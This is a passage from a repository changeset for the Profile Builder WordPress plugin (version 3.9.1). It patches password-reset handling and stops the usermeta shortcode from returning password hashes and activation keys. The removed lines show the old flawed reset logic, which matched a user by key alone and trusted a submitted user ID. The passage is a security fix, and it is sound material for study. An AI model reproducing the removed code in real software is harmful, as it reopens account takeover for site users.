  | 370 |  | if( empty( $user\_object ) || ( !empty( $user\_object ) && $user\_object->ID === absint( $\_POST['userData'] ) ) ){ |
  |  | 352 | if( isset( $\_POST['login'] ) ) |
  |  | 353 | $login = sanitize\_text\_field( $\_POST['login'] ); |
  |  | 354 | else |
  |  | 355 | $login = ''; |
  |  | 356 |  |
  |  | 357 | if( empty( $login ) ){ |
  |  | 358 | $password\_change\_message = \_\_('Login cannot be empty!', 'profile-builder'); |
  |  | 359 | $output .= wppb\_password\_recovery\_error( $password\_change\_message, 'wppb\_recover\_password\_password\_changed\_message2' ); |
  |  | 360 | } |
  |  | 361 |  |
  |  | 362 | $user = check\_password\_reset\_key( $key, $login ); |
  |  | 363 |  |
  |  | 364 | if( is\_wp\_error( $user ) || empty( $user ) || ( !empty( $user ) && $user->ID != absint( $\_POST['userData'] ) ) ){ |
  | 371 | 365 | $password\_change\_message = \_\_('Invalid key!', 'profile-builder'); |
  | 372 | 366 | $output .= wppb\_password\_recovery\_error( $password\_change\_message, 'wppb\_recover\_password\_password\_changed\_message2' ); |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L395) | […](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L389) |  |
  | 395 | 389 | $password\_changed\_success = true; |
  | 396 | 390 |  |
  | 397 |  |  |
  | 398 |  |  |
  | 399 |  | $userID = absint( $\_POST['userData'] ); |
  |  | 391 | $userID = $user->ID; |
  | 400 | 392 | $new\_pass = $\_POST['passw1']; // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized, WordPress.Security.ValidatedSanitizedInput.MissingUnslash |
  | 401 | 393 |  |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L454) | […](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L446) |  |
  | 454 | 446 |  |
  | 455 | 447 | //this is the part that shows the forms |
  | 456 |  | if( isset( $\_GET['key'] ) ){ |
  | 457 |  |  |
  | 458 |  | $key = sanitize\_text\_field( $\_GET['key'] ); |
  | 459 |  |  |
  | 460 |  | if( !empty( $key ) && !$password\_changed\_success ) { |
  | 461 |  |  |
  | 462 |  | //get the login name and key and verify if they match the ones in the database |
  | 463 |  | $user = $wpdb->get\_row( $wpdb->prepare( "SELECT \* FROM $wpdb->users WHERE user\_activation\_key = %s", $key ) ); |
  | 464 |  |  |
  | 465 |  | if( !empty( $user ) ) { |
  |  | 448 | if( isset( $\_GET['key'] ) && isset( $\_GET['login'] ) ){ |
  |  | 449 |  |
  |  | 450 | $key   = sanitize\_text\_field( $\_GET['key'] ); |
  |  | 451 | $login = sanitize\_text\_field( $\_GET['login'] ); |
  |  | 452 |  |
  |  | 453 | if( !empty( $key ) && !empty( $login ) && !$password\_changed\_success ) { |
  |  | 454 |  |
  |  | 455 | $user = check\_password\_reset\_key( $key, $login ); |
  |  | 456 |  |
  |  | 457 | if( !is\_wp\_error( $user ) ){ |
  |  | 458 |  |
  | 466 | 459 | ob\_start(); |
  | 467 |  | ~~wppb\_create\_recover\_password\_form($user, $\_POST~~); |
  | 468 |  | $output .= ob\_get\_contents(); |
  |  | 460 | wppb\_create\_recover\_password\_form( $user, $\_POST ); |
  |  | 461 | $output .= ob\_get\_contents(); |
  | 469 | 462 | ob\_end\_clean(); |
  | 470 |  | } |
  | 471 |  | else { |
  |  | 463 |  |
  |  | 464 | } else { |
  | 472 | 465 | $output .= wppb\_password\_recovery\_error('<b>' . \_\_('ERROR:', 'profile-builder') . '</b>' . \_\_('Invalid key!', 'profile-builder'), 'wppb\_recover\_password\_invalid\_key\_message'); |
  | 473 | 466 | } |
* ## [profile-builder/tags/3.9.1/index.php](/changeset/2864329/profile-builder/tags/3.9.1/index.php "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/index.php")

  | [r2862446](/browser/profile-builder/trunk/index.php?rev=2862446#L4 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/index.php?rev=2864329#L4 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | \* Plugin URI: https://www.cozmoslabs.com/wordpress-profile-builder/ |
  | 5 | 5 | \* Description: Login, registration and edit profile shortcodes for the front-end. Also you can choose what fields should be displayed or add new (custom) ones both in the front-end and in the dashboard. |
  | 6 |  | \* Version: 3.9.~~0~~ |
  |  | 6 | \* Version: 3.9.1 |
  | 7 | 7 | \* Author: Cozmoslabs |
  | 8 | 8 | \* Author URI: https://www.cozmoslabs.com/ |
  | […](/browser/profile-builder/trunk/index.php?rev=2862446#L10) | […](/browser/profile-builder/tags/3.9.1/index.php?rev=2864329#L10) |  |
  | 10 | 10 | \* Domain Path: /translation |
  | 11 | 11 | \* License: GPL2 |
  | 12 |  | \* Elementor tested up to: 3.1~~0.2~~ |
  | 13 |  | \* Elementor Pro tested up to: 3.1~~0.2~~ |
  |  | 12 | \* Elementor tested up to: 3.11.0 |
  |  | 13 | \* Elementor Pro tested up to: 3.11.0 |
  | 14 | 14 | \* |
  | 15 | 15 | \* == Copyright == |
  | […](/browser/profile-builder/trunk/index.php?rev=2862446#L397) | […](/browser/profile-builder/tags/3.9.1/index.php?rev=2864329#L397) |  |
  | 397 | 397 | \* |
  | 398 | 398 | \*/ |
  | 399 |  | define('PROFILE\_BUILDER\_VERSION', '3.9.~~0~~' ); |
  |  | 399 | define('PROFILE\_BUILDER\_VERSION', '3.9.1' ); |
  | 400 | 400 | define('WPPB\_PLUGIN\_DIR', plugin\_dir\_path(\_\_FILE\_\_)); |
  | 401 | 401 | define('WPPB\_PLUGIN\_URL', plugin\_dir\_url(\_\_FILE\_\_)); |
* ## [profile-builder/tags/3.9.1/readme.txt](/changeset/2864329/profile-builder/tags/3.9.1/readme.txt "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/readme.txt")

  | [r2862446](/browser/profile-builder/trunk/readme.txt?rev=2862446#L5 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/readme.txt?rev=2864329#L5 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Requires at least: 3.1 |
  | 6 | 6 | Tested up to: 6.1 |
  | 7 |  | Stable tag: 3.9.~~0~~ |
  |  | 7 | Stable tag: 3.9.1 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/profile-builder/trunk/readme.txt?rev=2862446#L178) | […](/browser/profile-builder/tags/3.9.1/readme.txt?rev=2864329#L178) |  |
  | 178 | 178 |  |
  | 179 | 179 | == Changelog == |
  |  | 180 | = 3.9.1 = |
  |  | 181 | \* Fix: Improve security for password reset functionality. Thanks to Istvan Marton (Lana Codes) |
  |  | 182 | \* Fix: Disallow retrieval of certain user keys through the optional usermeta shortcode. Thanks to Istvan Marton (Lana Codes) |
  |  | 183 |  |
  | 180 | 184 | = 3.9.0 = |
  | 181 | 185 | \* Fix: Issue with the Email From filter |
* ## [profile-builder/tags/3.9.1/translation/profile-builder.catalog.php](/changeset/2864329/profile-builder/tags/3.9.1/translation/profile-builder.catalog.php "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/translation/profile-builder.catalog.php")

  | [r2836042](/browser/profile-builder/trunk/translation/profile-builder.catalog.php?rev=2836042#L903 "Show revision 2836042 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/translation/profile-builder.catalog.php?rev=2864329#L903 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 903 | 903 | <?php \_\_("The password must not be empty!", "profile-builder"); ?> |
  | 904 | 904 | <?php \_\_("The key cannot be empty!", "profile-builder"); ?> |
  |  | 905 | <?php \_\_("Login cannot be empty!", "profile-builder"); ?> |
  | 905 | 906 | <?php \_\_("Invalid key!", "profile-builder"); ?> |
  | 906 | 907 | <?php \_\_("The entered passwords don't match!", "profile-builder"); ?> |
* ## [profile-builder/tags/3.9.1/translation/profile-builder.pot](/changeset/2864329/profile-builder/tags/3.9.1/translation/profile-builder.pot "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/translation/profile-builder.pot")

  | [r2861357](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L850 "Show revision 2861357 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L850 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 850 | 850 | msgstr "" |
  | 851 | 851 |  |
  | 852 |  | #: admin/general-settings.php:314, front-end/login.php:540, front-end/recover.php:~~118~~, add-ons/email-customizer/email-customizer.php:29, add-ons/user-listing/userlisting.php:119, add-ons/user-listing/userlisting.php:891, add-ons/user-listing/userlisting.php:2568, features/admin-approval/class-admin-approval.php:177, features/email-confirmation/class-email-confirmation.php:169, features/email-customizer/email-customizer.php:29, add-ons-free/gdpr-communication-preferences/admin/manage-fields.php:24, add-ons-free/gdpr-communication-preferences/front-end/gdpr-communication-preferences.php:9, admin/advanced-settings/includes/shortcodes/resend-activation.php:9 |
  |  | 852 | #: admin/general-settings.php:314, front-end/login.php:540, front-end/recover.php:96, add-ons/email-customizer/email-customizer.php:29, add-ons/user-listing/userlisting.php:119, add-ons/user-listing/userlisting.php:891, add-ons/user-listing/userlisting.php:2568, features/admin-approval/class-admin-approval.php:177, features/email-confirmation/class-email-confirmation.php:169, features/email-customizer/email-customizer.php:29, add-ons-free/gdpr-communication-preferences/admin/manage-fields.php:24, add-ons-free/gdpr-communication-preferences/front-end/gdpr-communication-preferences.php:9, admin/advanced-settings/includes/shortcodes/resend-activation.php:9 |
  | 853 | 853 | msgid "Email" |
  | 854 | 854 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L1442) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L1442) |  |
  | 1442 | 1442 | msgstr "" |
  | 1443 | 1443 |  |
  | 1444 |  | #: admin/manage-fields.php:398, front-end/login.php:121, front-end/recover.php:~~72~~, add-ons/email-customizer/email-customizer.php:30, features/email-customizer/email-customizer.php:30 |
  |  | 1444 | #: admin/manage-fields.php:398, front-end/login.php:121, front-end/recover.php:49, add-ons/email-customizer/email-customizer.php:30, features/email-customizer/email-customizer.php:30 |
  | 1445 | 1445 | msgid "Password" |
  | 1446 | 1446 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L1450) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L1450) |  |
  | 1450 | 1450 | msgstr "" |
  | 1451 | 1451 |  |
  | 1452 |  | #: admin/manage-fields.php:399, front-end/recover.php:~~73~~ |
  |  | 1452 | #: admin/manage-fields.php:399, front-end/recover.php:50 |
  | 1453 | 1453 | msgid "Repeat Password" |
  | 1454 | 1454 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3366) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L3366) |  |
  | 3366 | 3366 | msgstr "" |
  | 3367 | 3367 |  |
  | 3368 |  | #: features/functions.php:821, front-end/recover.php:38~~6~~, front-end/default-fields/password/password.php:59 |
  |  | 3368 | #: features/functions.php:821, front-end/recover.php:380, front-end/default-fields/password/password.php:59 |
  | 3369 | 3369 | msgid "The password must have a minimum strength of %s" |
  | 3370 | 3370 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3539) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L3539) |  |
  | 3539 | 3539 | msgstr "" |
  | 3540 | 3540 |  |
  | 3541 |  | #: front-end/login.php:322, front-end/login.php:414, front-end/login.php:452, front-end/recover.php:18, front-end/recover.php:3~~26~~, features/two-factor-authentication/class-two-factor-authentication.php:577, front-end/default-fields/fields-functions.php:62, front-end/extra-fields/extra-fields.php:118 |
  |  | 3541 | #: front-end/login.php:322, front-end/login.php:414, front-end/login.php:452, front-end/recover.php:18, front-end/recover.php:309, features/two-factor-authentication/class-two-factor-authentication.php:577, front-end/default-fields/fields-functions.php:62, front-end/extra-fields/extra-fields.php:118 |
  | 3542 | 3542 | msgid "ERROR" |
  | 3543 | 3543 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3603) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L3603) |  |
  | 3603 | 3603 | msgstr "" |
  | 3604 | 3604 |  |
  | 3605 |  | #: front-end/login.php:550, front-end/recover.php:1~~22~~ |
  |  | 3605 | #: front-end/login.php:550, front-end/recover.php:100 |
  | 3606 | 3606 | msgid "Username or Email" |
  | 3607 | 3607 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L3615) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L3615) |  |
  | 3615 | 3615 | msgstr "" |
  | 3616 | 3616 |  |
  | 3617 |  | #: front-end/recover.php:~~93~~ |
  |  | 3617 | #: front-end/recover.php:70 |
  | 3618 | 3618 | msgid "Reset Password" |
  | 3619 | 3619 | msgstr "" |
  | 3620 | 3620 |  |
  | 3621 |  | #: front-end/recover.php:~~121~~ |
  |  | 3621 | #: front-end/recover.php:99 |
  | 3622 | 3622 | msgid "Please enter your username or email address." |
  | 3623 | 3623 | msgstr "" |
  | 3624 | 3624 |  |
  | 3625 |  | #: front-end/recover.php:~~117~~ |
  |  | 3625 | #: front-end/recover.php:95 |
  | 3626 | 3626 | msgid "Please enter your email address." |
  | 3627 | 3627 | msgstr "" |
  | 3628 | 3628 |  |
  | 3629 |  | #: front-end/recover.php:1~~25~~ |
  |  | 3629 | #: front-end/recover.php:103 |
  | 3630 | 3630 | msgid "You will receive a link to create a new password via email." |
  | 3631 | 3631 | msgstr "" |
  | 3632 | 3632 |  |
  | 3633 |  | #: front-end/recover.php:1~~38~~ |
  |  | 3633 | #: front-end/recover.php:116 |
  | 3634 | 3634 | msgid "Get New Password" |
  | 3635 | 3635 | msgstr "" |
  | 3636 | 3636 |  |
  | 3637 |  | #: front-end/recover.php:1~~84~~ |
  |  | 3637 | #: front-end/recover.php:167 |
  | 3638 | 3638 | msgid "Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s" |
  | 3639 | 3639 | msgstr "" |
  | 3640 | 3640 |  |
  | 3641 |  | #: front-end/recover.php:1~~87~~ |
  |  | 3641 | #: front-end/recover.php:170 |
  | 3642 | 3642 | msgid "Password Reset from %1$s" |
  | 3643 | 3643 | msgstr "" |
  | 3644 | 3644 |  |
  | 3645 |  | #: front-end/recover.php:~~214~~ |
  |  | 3645 | #: front-end/recover.php:197 |
  | 3646 | 3646 | msgid "You have successfully reset your password." |
  | 3647 | 3647 | msgstr "" |
  | 3648 | 3648 |  |
  | 3649 |  | #: front-end/recover.php:~~216~~ |
  |  | 3649 | #: front-end/recover.php:199 |
  | 3650 | 3650 | msgid "Password Successfully Reset for %1$s on %2$s" |
  | 3651 | 3651 | msgstr "" |
  | 3652 | 3652 |  |
  | 3653 |  | #: front-end/recover.php:2~~34~~ |
  |  | 3653 | #: front-end/recover.php:217 |
  | 3654 | 3654 | msgid "%1$s has requested a password change via the password reset feature.<br/>His/her new password is:%2$s" |
  | 3655 | 3655 | msgstr "" |
  | 3656 | 3656 |  |
  | 3657 |  | #: front-end/recover.php:2~~71~~ |
  |  | 3657 | #: front-end/recover.php:254 |
  | 3658 | 3658 | msgid "You are already logged in. You can change your password on the edit profile form." |
  | 3659 | 3659 | msgstr "" |
  | 3660 | 3660 |  |
  | 3661 |  | #: front-end/recover.php:4~~46~~ |
  |  | 3661 | #: front-end/recover.php:438 |
  | 3662 | 3662 | msgid "The password must not be empty!" |
  | 3663 | 3663 | msgstr "" |
  | 3664 | 3664 |  |
  | 3665 |  | #: front-end/recover.php:3~~65~~ |
  |  | 3665 | #: front-end/recover.php:348 |
  | 3666 | 3666 | msgid "The key cannot be empty!" |
  | 3667 | 3667 | msgstr "" |
  | 3668 | 3668 |  |
  | 3669 |  | #: front-end/recover.php:371, front-end/recover.php:472 |
  |  | 3669 | #: front-end/recover.php:358 |
  |  | 3670 | msgid "Login cannot be empty!" |
  |  | 3671 | msgstr "" |
  |  | 3672 |  |
  |  | 3673 | #: front-end/recover.php:365, front-end/recover.php:465 |
  | 3670 | 3674 | msgid "Invalid key!" |
  | 3671 | 3675 | msgstr "" |
  | 3672 | 3676 |  |
  | 3673 |  | #: front-end/recover.php:37~~6~~ |
  |  | 3677 | #: front-end/recover.php:370 |
  | 3674 | 3678 | msgid "The entered passwords don't match!" |
  | 3675 | 3679 | msgstr "" |
  | 3676 | 3680 |  |
  | 3677 |  | #: front-end/recover.php:3~~82~~, front-end/default-fields/password/password.php:55 |
  |  | 3681 | #: front-end/recover.php:376, front-end/default-fields/password/password.php:55 |
  | 3678 | 3682 | msgid "The password must have the minimum length of %s characters" |
  | 3679 | 3683 | msgstr "" |
  | 3680 | 3684 |  |
  | 3681 |  | #: front-end/recover.php:3~~93~~ |
  |  | 3685 | #: front-end/recover.php:387 |
  | 3682 | 3686 | msgid "Your password has been successfully changed!" |
  | 3683 | 3687 | msgstr "" |
  | 3684 | 3688 |  |
  | 3685 |  | #: front-end/recover.php:2~~99~~ |
  |  | 3689 | #: front-end/recover.php:282 |
  | 3686 | 3690 | msgid "The username entered wasn't found in the database!" |
  | 3687 | 3691 | msgstr "" |
  | 3688 | 3692 |  |
  | 3689 |  | #: front-end/recover.php:2~~99~~ |
  |  | 3693 | #: front-end/recover.php:282 |
  | 3690 | 3694 | msgid "Please check that you entered the correct username." |
  | 3691 | 3695 | msgstr "" |
  | 3692 | 3696 |  |
  | 3693 |  | #: front-end/recover.php:3~~42~~ |
  |  | 3697 | #: front-end/recover.php:325 |
  | 3694 | 3698 | msgid "The email address entered wasn't found in the database!" |
  | 3695 | 3699 | msgstr "" |
  | 3696 | 3700 |  |
  | 3697 |  | #: front-end/recover.php:3~~42~~ |
  |  | 3701 | #: front-end/recover.php:325 |
  | 3698 | 3702 | msgid "Please check that you entered the correct email address." |
  | 3699 | 3703 | msgstr "" |
  | 3700 | 3704 |  |
  | 3701 |  | #: front-end/recover.php:~~312~~ |
  |  | 3705 | #: front-end/recover.php:295 |
  | 3702 | 3706 | msgid "Check your email for the confirmation link." |
  | 3703 | 3707 | msgstr "" |
  | 3704 | 3708 |  |
  | 3705 |  | #: front-end/recover.php:3~~26~~ |
  |  | 3709 | #: front-end/recover.php:309 |
  | 3706 | 3710 | msgid "There was an error while trying to send the activation link to %1$s!" |
  | 3707 | 3711 | msgstr "" |
  | 3708 | 3712 |  |
  | 3709 |  | #: front-end/recover.php:4~~72~~ |
  |  | 3713 | #: front-end/recover.php:465 |
  | 3710 | 3714 | msgid "ERROR:" |
  | 3711 | 3715 | msgstr "" |
  | […](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2861357#L4112) | […](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329#L4116) |  |
  | 4112 | 4116 | msgstr "" |
  | 4113 | 4117 |  |
  | 4114 |  | #: add-ons/email-customizer/email-customizer.php:60~~1, features/email-customizer/email-customizer.php:578~~ |
  |  | 4118 | #: add-ons/email-customizer/email-customizer.php:602, features/email-customizer/email-customizer.php:579 |
  | 4115 | 4119 | msgid "The users selected password at signup" |
  | 4116 | 4120 | msgstr "" |
  | 4117 | 4121 |  |
  | 4118 |  | #: add-ons/email-customizer/email-customizer.php:6~~09, add-ons/email-customizer/email-customizer.php:616, add-ons/email-customizer/email-customizer.php:630, features/email-confirmation/email-confirmation.php:618, features/email-customizer/email-customizer.php:586, features/email-customizer/email-customizer.php:593, features/email-customizer/email-customizer.php:607~~ |
  |  | 4122 | #: add-ons/email-customizer/email-customizer.php:610, add-ons/email-customizer/email-customizer.php:617, add-ons/email-customizer/email-customizer.php:631, features/email-confirmation/email-confirmation.php:618, features/email-customizer/email-customizer.php:587, features/email-customizer/email-customizer.php:594, features/email-customizer/email-customizer.php:608 |
  | 4119 | 4123 | msgid "Your selected password at signup" |
  | 4120 | 4124 | msgstr "" |
* ## [profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php](/changeset/2864329/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php "Show the changeset 2864329 restricted to profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php")

  | [r2555038](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L21 "Show revision 2555038 of this file in browser") | [r2864329](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L21 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 21 | 21 | } |
  | 22 | 22 |  |
  |  | 23 | if( in\_array( $atts['key'], array( 'user\_pass', 'user\_activation\_key' ) ) ) |
  |  | 24 | return; |
  | 23 | 25 |  |
  | 24 |  | $user = new WP\_User(~~$atts['user\_id']~~); |
  |  | 26 | $user = new WP\_User( $atts['user\_id'] ); |
  | 25 | 27 |  |
  | 26 | 28 | if ( !$user->exists() ) return; |
  | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L37) | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L39) |  |
  | 37 | 39 |  |
  | 38 | 40 | if ( $user->has\_prop( $atts['key'] ) ){ |
  |  | 41 |  |
  | 39 | 42 | if ($atts['wpautop'] == 'on'){ |
  | 40 | 43 | $value = wpautop( $user->get( $atts['key'] ) ); |
  | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L42) | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L45) |  |
  | 42 | 45 | $value = $user->get( $atts['key'] ); |
  | 43 | 46 | } |
  |  | 47 |  |
  | 44 | 48 | } |
  | 45 | 49 |  |
* ## [profile-builder/trunk/features/email-customizer/email-customizer.php](/changeset/2864329/profile-builder/trunk/features/email-customizer/email-customizer.php "Show the changeset 2864329 restricted to profile-builder/trunk/features/email-customizer/email-customizer.php")

  | [r2862446](/browser/profile-builder/trunk/features/email-customizer/email-customizer.php?rev=2862446#L169 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/trunk/features/email-customizer/email-customizer.php?rev=2864329#L169 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 169 | 169 | function wppb\_email\_customizer\_password\_reset\_content\_filter\_handler( $default\_string, $user\_id, $user\_login, $user\_email ) { |
  | 170 | 170 | $email\_customizer\_option = get\_option( 'wppb\_user\_emailc\_reset\_email\_content', 'not\_found' ); |
  | 171 |  | $key = wppb\_retrieve\_activation\_key( $user\_login ); |
  | 172 |  | $url = add\_query\_arg( array( 'key' => $key ), wppb\_curpageurl() ); |
  |  | 171 | $user = new WP\_User( $user\_id ); |
  |  | 172 | $key = get\_password\_reset\_key( $user ); |
  |  | 173 | $url = add\_query\_arg( array( 'key' => $key, 'login' => $user->user\_login ), wppb\_curpageurl() ); |
  | 173 | 174 |  |
  | 174 | 175 | if( $email\_customizer\_option != 'not\_found' ) { |
* ## [profile-builder/trunk/front-end/recover.php](/changeset/2864329/profile-builder/trunk/front-end/recover.php "Show the changeset 2864329 restricted to profile-builder/trunk/front-end/recover.php")

  | [r2801035](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L24 "Show revision 2801035 of this file in browser") | [r2864329](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L24 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 24 | 24 | } |
  | 25 | 25 |  |
  | 26 |  | ~~/\*\*~~ |
  | 27 |  | ~~\* Function that retrieves the unique user key from the database. If we don't have one we generate one and add it to the database~~ |
  | 28 |  | ~~\*~~ |
  | 29 |  | ~~\* @param string $requested\_user\_login the user login~~ |
  | 30 |  | ~~\*~~ |
  | 31 |  | ~~\*/~~ |
  | 32 |  | ~~function wppb\_retrieve\_activation\_key( $requested\_user\_login ){~~ |
  | 33 |  | ~~global $wpdb;~~ |
  | 34 |  |  |
  | 35 |  | ~~$key = $wpdb->get\_var( $wpdb->prepare( "SELECT user\_activation\_key FROM $wpdb->users WHERE user\_login = %s", $requested\_user\_login ) );~~ |
  | 36 |  |  |
  | 37 |  | ~~if ( empty( $key ) ) {~~ |
  | 38 |  |  |
  | 39 |  | ~~// Generate something random for a key...~~ |
  | 40 |  | ~~$key = wp\_generate\_password( 20, false );~~ |
  | 41 |  | ~~do\_action('wppb\_retrieve\_password\_key', $requested\_user\_login, $key);~~ |
  | 42 |  |  |
  | 43 |  | ~~// Now insert the new md5 key into the db~~ |
  | 44 |  | ~~$wpdb->update($wpdb->users, array('user\_activation\_key' => $key), array('user\_login' => $requested\_user\_login));~~ |
  | 45 |  | ~~}~~ |
  | 46 |  |  |
  | 47 |  | ~~return $key;~~ |
  | 48 |  | ~~}~~ |
  | 49 | 26 |  |
  | 50 | 27 | /\*\* |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L95) | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L72) |  |
  | 95 | 72 | <input name="action2" type="hidden" id="action2" value="recover\_password2" /> |
  | 96 | 73 | <input name="key" type="hidden" id="key" value="<?php echo esc\_attr( isset( $\_GET['key'] ) ? sanitize\_text\_field( $\_GET['key'] ) : '' ) ?>" /> |
  |  | 74 | <input name="login" type="hidden" id="login" value="<?php echo esc\_attr( isset( $\_GET['login'] ) ? sanitize\_text\_field( $\_GET['login'] ) : '' ) ?>" /> |
  | 97 | 75 | </p><!-- .form-submit --> |
  | 98 | 76 | <?php wp\_nonce\_field( 'verify\_true\_password\_recovery2\_'.$user->ID, 'password\_recovery\_nonce\_field2' ); ?> |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L172) | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L150) |  |
  | 172 | 150 | return false; |
  | 173 | 151 |  |
  | 174 |  | $requested\_user\_id = $user->ID; |
  | 175 |  | $requested\_user\_login = $user->user\_login; |
  | 176 |  | $requested\_user\_email = $user->user\_email; |
  |  | 152 | $user\_object = new WP\_User( $user->ID ); |
  |  | 153 |  |
  |  | 154 | if( empty( $user\_object->ID ) ) |
  |  | 155 | return false; |
  |  | 156 |  |
  |  | 157 | $requested\_user\_id    = $user\_object->ID; |
  |  | 158 | $requested\_user\_login = $user\_object->user\_login; |
  |  | 159 | $requested\_user\_email = $user\_object->user\_email; |
  | 177 | 160 |  |
  | 178 | 161 | //search if there is already an activation key present, if not create one |
  | 179 |  | $key = ~~wppb\_retrieve\_activation\_key( $requested\_user\_login~~ ); |
  |  | 162 | $key = get\_password\_reset\_key( $user\_object ); |
  | 180 | 163 |  |
  | 181 | 164 | $display\_username\_email = wppb\_get\_email\_display\_username($user); |
  | 182 | 165 |  |
  | 183 | 166 | //send primary email message |
  | 184 |  | $recovery\_email\_message  = sprintf( \_\_('Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s', 'profile-builder'), $display\_username\_email, '<a href="'.esc\_url( add\_query\_arg( array( 'key' => $key~~), wppb\_curpageurl() ) ).'">'.esc\_url( add\_query\_arg( array( 'key' => $key~~ ), wppb\_curpageurl() ) ).'</a>' ); |
  |  | 167 | $recovery\_email\_message  = sprintf( \_\_('Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s', 'profile-builder'), $display\_username\_email, '<a href="'.esc\_url( add\_query\_arg( array( 'key' => $key, 'login' => $requested\_user\_login ), wppb\_curpageurl() ) ).'">'.esc\_url( add\_query\_arg( array( 'key' => $key, 'login' => $requested\_user\_login ), wppb\_curpageurl() ) ).'</a>' ); |
  | 185 | 168 | $recovery\_email\_message  = apply\_filters( 'wppb\_recover\_password\_message\_content\_sent\_to\_user1', $recovery\_email\_message, $requested\_user\_id, $requested\_user\_login, $requested\_user\_email ); |
  | 186 | 169 |  |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L367) | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329#L350) |  |
  | 367 | 350 | } |
  | 368 | 351 |  |
  | 369 |  | $user\_object = $wpdb->get\_row( $wpdb->prepare( "SELECT \* FROM $wpdb->users WHERE user\_activation\_key = %s", $key ) ); |
  | 370 |  | if( empty( $user\_object ) || ( !empty( $user\_object ) && $user\_object->ID === absint( $\_POST['userData'] ) ) ){ |
  |  | 352 | if( isset( $\_POST['login'] ) ) |
  |  | 353 | $login = sanitize\_text\_field( $\_POST['login'] ); |
  |  | 354 | else |
  |  | 355 | $login = ''; |
  |  | 356 |  |
  |  | 357 | if( empty( $login ) ){ |
  |  | 358 | $password\_change\_message = \_\_('Login cannot be empty!', 'profile-builder'); |
  |  | 359 | $output .= wppb\_password\_recovery\_error( $password\_change\_message, 'wppb\_recover\_password\_password\_changed\_message2' ); |
  |  | 360 | } |
  |  | 361 |  |
  |  | 362 | $user = check\_password\_reset\_key( $key, $login ); |
  |  | 363 |  |
  |  | 364 | if( is\_wp\_error( $user ) || empty( $user ) || ( !empty( $user ) && $user->ID != absint( $\_POST['userData'] ) ) ){ |
  | 371 | 365 | $password\_change\_message = \_\_('Invalid key!', 'profile-builder'); |
